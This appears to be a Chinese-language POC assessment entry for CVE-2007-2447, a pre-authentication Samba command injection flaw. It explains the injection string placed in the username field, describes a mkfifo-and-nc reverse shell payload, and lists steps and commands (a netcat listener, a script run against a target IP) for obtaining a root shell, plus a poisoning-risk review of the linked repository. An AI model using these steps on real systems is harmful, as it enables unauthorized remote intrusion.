## CVE-2007-2447 - Samba 命令注入

**漏洞编号:** CVE-2007-2447

**漏洞类型:** 命令注入

**影响应用:** Samba

**危害等级:** 高危

**CVSS评分:** 10.0

**影响版本:** Samba 3.0.0 - 3.0.25rc3

**利用条件:** 无需认证，目标需启用 'username map script' 配置选项，且攻击者需能够通过 SMB 协议连接目标。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析：该POC针对的是Samba 3.x系列中的一个经典历史漏洞（MS07-047同级别威胁）。漏洞的核心成因在于Samba在处理包含Shell元字符的用户登录请求时，未对‘username map script’配置项中的用户名进行充分过滤。POC代码显示，通过在用户名（username）字段注入格式为 '/=`nohup {payload} `' 的字符串，Samba服务器会直接将该字符串传递给内部Shell执行。代码中使用了pysmb库构建SMBConnection，通过在实例化时将恶意指令嵌入用户名参数，能够成功触发远程命令执行。该POC利用了mkfifo创建一个命名管道来实现交互式反弹Shell，这种方式比单纯的nc指令更稳定，且由于漏洞触发点位于身份验证之前（pre-auth），攻击者无需任何有效凭证即可利用。实验证明该POC在Kali Linux与Metasploitable 2等实验环境中具有极高的成功率。利用步骤：1. 准备攻击环境，安装Python依赖库pysmb。2. 在攻击机开启nc监听端口，例如使用命令 'nc -lnvp 4444'。3. 确定目标主机的IP地址及Samba服务端口（默认139或445）。4. 运行POC脚本：'python3 usermap_script_Command_Execution.py <目标IP> 139 <攻击机IP> 4444'。5. 观察监听窗口，一旦连接建立，即可获得目标系统的root权限Shell。投毒风险分析：该POC项目结构透明，核心逻辑由清晰的Python代码编写，主要依赖项为开源的pysmb库，未发现任何经过混淆的二进制文件、加壳后的Shellcode或恶意的外部下载行为。代码中明确指出了Payload的构造方式，即使用mkfifo和nc组合实现的反弹Shell，这是渗透测试中常见的标准技术手法。虽然脚本包含执行命令的功能，但其目的明确指向目标IP而非运行该脚本的本地宿主机。投毒风险主要集中在requirements.txt是否引用了恶意的第三方镜像或库，经核实pysmb为合法库。代码逻辑中没有发现窃取本地浏览器Cookie、扫描本地内网或向第三方C2服务器回传敏感信息的后门逻辑。整体评估该POC为纯粹的安全研究工具，安全性较高，属于低风险等级，但在运行前仍建议在隔离的沙箱或虚拟机环境中执行以确保万无一失。

**项目地址:** [https://github.com/abdulsaabir/CVE-2007-2447.git](https://github.com/abdulsaabir/CVE-2007-2447.git)

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
